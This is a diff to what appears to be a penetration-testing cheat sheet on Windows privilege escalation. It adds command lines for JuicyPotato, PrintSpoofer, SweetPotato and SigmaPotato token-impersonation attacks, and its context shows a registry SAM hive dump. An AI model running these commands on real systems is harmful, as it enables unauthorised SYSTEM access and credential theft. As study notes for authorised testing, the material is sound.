@@ -358,10 +358,20 @@ LSADump
 
 	https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file
 
-## Windows - SeImpersonatePrivilege
-Transfer SigmaPotato to target machine  
+## Windows - Potatoes (SeImpersonatePrivilege/SeAssignPrimaryToken)
+Transfer some kind of Potato to target machine  
 
 	./SigmaPotato.exe whoami
+Win8 - Win11/2012/2016/2019/2022  
+
+	./juicypotato.exe -l <port> -p cmd -t *
+Win7 - Win10/2008R2/2012/2016  
+
+	./printspoofer.exe -i -c cmd
+Win10/2016/2019  
+
+	./SweetPotato.exe -p cmd -e [DCOM|WinRM|EfsRpc|PrintSpoofer]
+Win7 - Win10/2019  
 
 ## Windows - SeBackupPrivilege
 	reg save hklm\sam sam.hive
